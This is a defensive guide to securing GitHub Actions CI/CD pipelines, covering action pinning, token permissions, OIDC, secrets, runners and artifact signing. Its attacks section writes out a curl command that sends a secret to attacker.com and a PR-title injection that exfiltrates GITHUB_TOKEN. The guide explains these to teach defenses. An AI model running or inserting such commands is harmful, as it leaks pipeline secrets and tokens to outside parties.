# Securing CI/CD Pipelines

A practical guide to hardening your CI/CD pipelines against supply chain attacks, secret leaks, and build tampering. Focused on GitHub Actions but the principles apply to any CI system.

---

## Table of Contents

1. [GitHub Actions Security](#github-actions-security)
2. [Secrets Management in CI/CD](#secrets-management-in-cicd)
3. [Build Environment Hardening](#build-environment-hardening)
4. [Artifact Integrity](#artifact-integrity)
5. [Common CI/CD Attacks](#common-cicd-attacks)
6. [Self-Hosted Runner Security](#self-hosted-runner-security)
7. [Reference Workflow Examples](#reference-workflow-examples)

---

## GitHub Actions Security

### Pin Actions by SHA, Not Tag

Tags are mutable. A maintainer (or an attacker who compromises the maintainer's account) can point `v4` at a completely different commit. Commit SHAs are immutable.

```yaml
# Bad: tag can be moved at any time
- uses: actions/checkout@v4

# Good: pinned to an exact commit
- uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
```

**How to find the SHA for a given tag:**

```bash
# Get the commit SHA for a tag
git ls-remote --tags https://github.com/actions/checkout.git v4.1.7
# Output: 692973e3d937129bcbf40652eb9f2f61becf3332  refs/tags/v4.1.7

# Or use the GitHub API
curl -s https://api.github.com/repos/actions/checkout/git/ref/tags/v4.1.7 | jq -r '.object.sha'
```

**Automate SHA pinning with Renovate or Dependabot:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot will submit PRs to update SHAs when new versions are released. You get the security of pinning with the convenience of automated updates.

### Restrict GITHUB_TOKEN Permissions

By default, `GITHUB_TOKEN` has broad read/write access to your repository. Restrict it.

```yaml
# Set restrictive defaults at the workflow level
permissions:
  contents: read    # Read-only access to repository contents

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write   # Only if this job pushes to GHCR
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
```

**Permission reference:**

| Permission | When to Grant |
|-----------|--------------|
| `contents: read` | Almost always (checkout code) |
| `contents: write` | Only if you push commits or create releases |
| `packages: write` | Only if you push container images to GHCR |
| `id-token: write` | Only for OIDC (keyless signing, cloud auth) |
| `pull-requests: write` | Only if you post PR comments |
| `actions: read` | Only if you read workflow run metadata |
| `security-events: write` | Only if you upload SARIF to code scanning |

**Set the org-wide default to read-only:**

Go to Organization Settings > Actions > General > Workflow permissions > "Read repository contents and packages permissions."

### OIDC for Cloud Authentication

Instead of storing long-lived cloud credentials as secrets, use GitHub's OIDC provider. Your workflow proves its identity to AWS/GCP/Azure and gets a short-lived token.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # Required for OIDC
      contents: read
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1
          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed
```

**AWS IAM trust policy for GitHub Actions OIDC:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

The `sub` condition restricts which branches/tags can assume the role. Be specific. Do not use `repo:myorg/myrepo:*` unless you want every branch and PR to have access.

### Restrict Fork Pull Request Workflows

Forks can submit PRs that modify workflow files. If `pull_request_target` is misconfigured, a fork PR can run with your secrets.

```yaml
# Safe: pull_request runs in the fork's context with no access to secrets
on:
  pull_request:
    branches: [main]

# Dangerous: pull_request_target runs in the base repo context WITH secrets
# Only use this if you understand the security implications
on:
  pull_request_target:
    branches: [main]
```

**Rules for `pull_request_target`:**

1. Never check out the PR's code (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`). If you must, do it in a separate job with no secrets.
2. Never run untrusted code from the PR (build scripts, test scripts, Makefiles).
3. Use it only for trusted operations like labeling or commenting.

---

## Secrets Management in CI/CD

### Never Echo Secrets

This seems obvious but it happens constantly. Even "masked" secrets can leak.

```yaml
# Bad: the secret is in the process list, logs, and shell history
- run: echo ${{ secrets.API_KEY }}

# Bad: curl verbose mode will log the header with the token
- run: curl -v -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://api.example.com

# Good: use environment variables (GitHub masks these in logs)
- run: curl -H "Authorization: Bearer $API_KEY" https://api.example.com
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

### How Secrets Leak in CI/CD

| Leak Vector | Example | Prevention |
|------------|---------|-----------|
| Build logs | `echo $SECRET` or verbose mode | Never echo. Set `-x` carefully in bash. |
| Error messages | Stack traces containing connection strings | Sanitize error output. |
| Environment dumps | `env` or `printenv` in debug mode | Never run `env` in CI. |
| Artifact uploads | `.env` file included in build artifact | Add `.env` to `.gitignore` and artifact exclusions. |
| PR titles/descriptions | "Updated API key to sk_live_abc123" | Educate developers. Use branch protections. |
| Build cache | Secret baked into a Docker layer | Use multi-stage builds. Use `--secret` flag. |

### Docker Build Secrets

```dockerfile
# Bad: secret is baked into the image layer forever
ARG NPM_TOKEN
RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc
RUN npm install
RUN rm .npmrc  # Does not help: it is still in a previous layer

# Good: use Docker BuildKit secrets (never persisted in layers)
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm install
```

```bash
# Build with the secret mounted
DOCKER_BUILDKIT=1 docker build --secret id=npmrc,src=$HOME/.npmrc -t myapp .
```

### External Vault Integration

For high-security environments, do not store secrets in GitHub at all. Pull them from a vault at runtime.

```yaml
# HashiCorp Vault with GitHub OIDC
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Authenticate to Vault
        uses: hashicorp/vault-action@d1720f055e0635fd932a1d2a48f87a666a57906c # v3.0.0
        with:
          url: https://vault.mycompany.com
          method: jwt
          role: github-actions
          jwtGithubAudience: https://vault.mycompany.com
          secrets: |
            secret/data/myapp/prod db_password | DB_PASSWORD ;
            secret/data/myapp/prod api_key | API_KEY

      - name: Deploy
        run: ./deploy.sh
        env:
          DB_PASSWORD: ${{ steps.vault.outputs.DB_PASSWORD }}
```

### Secret Rotation

Secrets should have a maximum lifetime. When a secret might have leaked:

```bash
# Rotate GitHub Actions secrets via CLI
gh secret set API_KEY --body "new-secret-value-here"

# List all secrets (names only, not values)
gh secret list

# Rotate secrets across multiple repos
for repo in myorg/repo1 myorg/repo2 myorg/repo3; do
  gh secret set API_KEY --repo "$repo" --body "$(openssl rand -hex 32)"
done
```

---

## Build Environment Hardening

### Ephemeral Runners

Build environments should be disposable. Every build starts from a clean image and is destroyed after.

**Why:**
- A compromised build from yesterday should not affect today's build.
- Malware persistence in the build environment is impossible.
- No shared state means no cross-contamination between projects.

GitHub-hosted runners are ephemeral by default. Each job gets a fresh VM.

For self-hosted runners, use autoscaling with ephemeral mode:

```bash
# Register a self-hosted runner in ephemeral mode
./config.sh --url https://github.com/myorg/myrepo \
  --token REGISTRATION_TOKEN \
  --ephemeral \
  --name "ephemeral-runner-$(date +%s)"
```

### No Shared State

```yaml
# Bad: relying on state from a previous build
jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: npm install  # Uses node_modules from a previous build if it exists

# Good: clean install every time
jobs:
  build:
    runs-on: ubuntu-latest  # Ephemeral GitHub-hosted runner
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
        with:
          clean: true    # Clean the workspace before checkout

      - run: npm ci       # Clean install from lock file, ignores existing node_modules
```

### Network Restrictions

Limit what your build environment can reach. A compromised build should not be able to exfiltrate data to an arbitrary endpoint.

```yaml
# Example: restrict outbound network in a Docker-based build
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:20-bookworm-slim
      options: --network=none   # No network access during build
    steps:
      # Pre-download dependencies in a previous step with network access
      # Then build with no network
      - run: npm run build
```

### Minimal Build Images

```dockerfile
# Use minimal base images for builds
FROM node:20-bookworm-slim AS builder
# Slim images have fewer preinstalled tools for an attacker to use

# Use distroless or scratch for the final image
FROM gcr.io/distroless/nodejs20-debian12
COPY --from=builder /app/dist /app
CMD ["app/server.js"]
```

---

## Artifact Integrity

### Signing Build Outputs

Every artifact your pipeline produces should be signed so consumers can verify it came from your pipeline and was not tampered with.

```yaml
jobs:
  build-and-sign:
    runs-on: ubuntu-latest
    permissions:
      id-token: write    # OIDC for keyless signing
      packages: write
      contents: read
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7

      - name: Build and push container image
        id: build
        run: |
          docker build -t ghcr.io/myorg/myapp:${{ github.sha }} .
          docker push ghcr.io/myorg/myapp:${{ github.sha }}
          echo "digest=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/myorg/myapp:${{ github.sha }} | cut -d@ -f2)" >> "$GITHUB_OUTPUT"

      - name: Install Cosign
        uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd1d5c67a7e1018 # v3.5.0

      - name: Sign the image
        run: cosign sign ghcr.io/myorg/myapp@${{ steps.build.outputs.digest }}
```

### SLSA Attestations

See the [Supply Chain Security guide](./supply-chain-security.md#slsa-build-provenance) for full details on SLSA provenance generation.

```yaml
# Attest a container image with GitHub's built-in attestation
- name: Attest build provenance
  uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c # v1.4.3
  with:
    subject-name: ghcr.io/myorg/myapp
    subject-digest: ${{ steps.build.outputs.digest }}
    push-to-registry: true
```

### Verifying Artifacts in Deployment

```bash
# Verify a container image before deploying
cosign verify ghcr.io/myorg/myapp@sha256:abc123... \
  --certificate-identity "https://github.com/myorg/myrepo/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"

# Only deploy if verification passes
if cosign verify ...; then
  kubectl set image deployment/myapp myapp=ghcr.io/myorg/myapp@sha256:abc123...
else
  echo "Signature verification failed. Aborting deployment."
  exit 1
fi
```

### Kubernetes Admission Control

Use a policy engine to enforce that only signed images can be deployed:

```yaml
# Kyverno policy: require Cosign signature
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-signed-images
spec:
  validationFailureAction: Enforce
  rules:
    - name: check-image-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
      verifyImages:
        - imageReferences:
            - "ghcr.io/myorg/*"
          attestors:
            - entries:
                - keyless:
                    issuer: "https://token.actions.githubusercontent.com"
                    subject: "https://github.com/myorg/*"
```

---

## Common CI/CD Attacks

### 1. Poisoned Dependencies

An attacker compromises a dependency your build pulls. When your CI runs `npm install`, it executes the attacker's code in your build environment.

**Examples:** event-stream (2018), ua-parser-js (2021), colors/faker (2022).

**Defenses:**
- Use lock files and `npm ci` (not `npm install`).
- Run `npm install --ignore-scripts` and rebuild explicitly.
- Scan dependencies with `npm audit`, Snyk, or Socket.dev.
- Review new dependencies before adding them.

### 2. Malicious Pull Requests

An attacker forks your repo, modifies the CI workflow or build scripts, and submits a PR. If your CI runs on PRs without restrictions, the attacker's code runs in your environment.

**Defenses:**
- Require approval for first-time contributors before CI runs.
- Use `pull_request` (not `pull_request_target`) for PR builds.
- Never pass secrets to PR builds from forks.
- Review workflow changes in PRs carefully.

GitHub setting: Settings > Actions > General > "Require approval for all outside collaborators."

### 3. TOCTOU (Time-of-Check-Time-of-Use)

You review a PR, approve it, and merge. Between approval and merge, the attacker pushes a new commit that changes the code. Your CI runs the new (unreviewed) code.

**Defenses:**
- Enable "Dismiss stale pull request approvals when new commits are pushed."
- Require CI to pass after the last commit, not just any commit.
- Use branch protection: "Require branches to be up to date before merging."

### 4. Secret Exfiltration via Build Logs

An attacker modifies a build script to print secrets:

```bash
# Attack: base64-encode the secret and embed it in a URL that gets logged
curl "https://attacker.com/collect?data=$(echo $SECRET | base64)"
```

**Defenses:**
- Do not expose secrets to PR builds.
- Restrict outbound network from build environments.
- Monitor build logs for base64-encoded strings and suspicious URLs.
- Use `--silent` and `--no-progress-meter` flags with curl in CI.

### 5. Compromised Runner Cache

If runners are not ephemeral, an attacker who compromises one build can plant malware that affects future builds.

**Defenses:**
- Use ephemeral runners.
- Do not cache sensitive data.
- Hash-verify cached dependencies.

```yaml
# Safe caching: uses a hash of the lock file as the cache key
- uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9 # v4.0.2
  with:
    path: node_modules
    key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}
    # Cache is invalidated whenever the lock file changes
```

### 6. GitHub Actions Injection via Untrusted Input

```yaml
# Vulnerable: PR title is injected directly into a shell command
- run: echo "Building PR: ${{ github.event.pull_request.title }}"
# An attacker sets the PR title to: "; curl https://attacker.com/steal?token=$GITHUB_TOKEN #"

# Safe: use an environment variable (GitHub handles escaping)
- run: echo "Building PR: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Never use `${{ }}` expressions directly in `run:` blocks with untrusted input. Always pass them through environment variables.

---

## Self-Hosted Runner Security

Self-hosted runners give you more control but more responsibility. GitHub-hosted runners are ephemeral and isolated by default. Self-hosted runners are not.

### Runner Isolation Requirements

| Requirement | How |
|------------|-----|
| Ephemeral | Use `--ephemeral` flag. Runner processes one job and de-registers. |
| Isolated | Run each job in a fresh container or VM. |
| Least privilege | Runner service account has minimal OS permissions. |
| Dedicated | Do not reuse runners across trust boundaries (public vs. private repos). |
| Monitored | Log all runner activity. Alert on unexpected processes. |

### Docker-in-Docker Runner

```yaml
# docker-compose.yml for a self-hosted runner
version: "3.8"
services:
  runner:
    image: myorg/github-runner:latest
    environment:
      - RUNNER_NAME=ephemeral-${HOSTNAME}
      - RUNNER_TOKEN=${RUNNER_TOKEN}
      - RUNNER_REPOSITORY_URL=https://github.com/myorg/myrepo
      - RUNNER_EPHEMERAL=true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # For Docker builds
    deploy:
      replicas: 3
      restart_policy:
        condition: any
```

> Warning: Mounting `docker.sock` gives the runner full Docker access on the host. This is a significant security boundary. Consider using rootless Docker or Sysbox for better isolation.

### Runner Group Restrictions

Restrict which repositories can use which runners:

1. Go to Organization > Settings > Actions > Runner groups.
2. Create groups like "production-runners" and "pr-runners."
3. Assign runners to groups.
4. Restrict group access to specific repositories.

Never let public repositories use self-hosted runners. An attacker can fork the repo, submit a PR, and run arbitrary code on your runner.

### Monitoring Runners

```bash
# Check runner status
gh api orgs/myorg/actions/runners --jq '.runners[] | {name, status, busy}'

# Check for runners that have been online too long (should be ephemeral)
gh api orgs/myorg/actions/runners --jq '.runners[] | select(.status == "online") | {name, labels}'
```

---

## Reference Workflow Examples

### Secure Build and Deploy Workflow

```yaml
# .github/workflows/build-deploy.yml
name: Build and Deploy
on:
  push:
    branches: [main]
    tags: ['v*']

# Restrictive default permissions
permissions:
  contents: read

jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7

      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci
      - run: npm run lint
      - run: npm test

  build:
    needs: lint-and-test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write   # For OIDC signing
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7

      - name: Log in to GHCR
        uses: docker/login-action@0d4c9c5ea7693da7b068278f7b52bda2a190a446 # v3.2.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        id: push
        uses: docker/build-push-action@1a162644f9a7e87d8f4b053101d1d9a712edc18c # v6.3.0
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}

      - name: Install Cosign
        uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd1d5c67a7e1018 # v3.5.0

      - name: Sign image
        run: cosign sign ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}

      - name: Generate SBOM
        uses: anchore/sbom-action@d94f46e13c6c62f59525ac9a1e147a99dc0b9bf5 # v0.17.0
        with:
          image: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
          format: cyclonedx-json
          output-file: sbom.json

      - name: Scan for vulnerabilities
        uses: aquasecurity/trivy-action@915b19bbe73b92a6cf82a1bc12b087c9a19a5fe2 # v0.28.0
        with:
          image-ref: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # For OIDC to AWS
      contents: read
    environment: production   # Requires manual approval
    steps:
      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1

      - name: Verify image signature before deploy
        run: |
          cosign verify ghcr.io/${{ github.repository }}@${{ needs.build.outputs.digest }} \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/build-deploy.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com"

      - name: Deploy
        run: |
          # Your deployment commands here
          echo "Deploying ghcr.io/${{ github.repository }}@${{ needs.build.outputs.digest }}"
```

### Secure PR Validation Workflow

```yaml
# .github/workflows/pr-check.yml
name: PR Validation
on:
  pull_request:           # Safe: runs in fork context, no secrets
    branches: [main]

permissions:
  contents: read          # Minimum permissions

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7

      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci --ignore-scripts    # Do not run install scripts from untrusted code
      - run: npm rebuild                 # Rebuild native modules explicitly
      - run: npm run lint
      - run: npm test

      - name: Check for new dependencies
        run: |
          # Diff the lock file to see if new packages were added
          git diff origin/main -- package-lock.json | grep '^\+.*"resolved"' || echo "No new dependencies"
```

---

## Quick Reference: CI/CD Security Checklist

- [ ] All Actions pinned by commit SHA
- [ ] `GITHUB_TOKEN` permissions set to minimum required
- [ ] OIDC used for cloud authentication (no long-lived credentials)
- [ ] Secrets never echoed or logged
- [ ] Docker build secrets used (not ARG for sensitive values)
- [ ] Fork PR workflows restricted (no secrets, require approval)
- [ ] Build environments are ephemeral
- [ ] Build artifacts signed with Cosign
- [ ] Dependency scanning runs on every build
- [ ] `${{ }}` expressions never used directly in `run:` with untrusted input
- [ ] Self-hosted runners are ephemeral and isolated
- [ ] Branch protections enabled (dismiss stale approvals, require up-to-date)
- [ ] Deployment requires manual approval for production

---

*From [AllSecurityNews.com](https://allsecuritynews.com)*
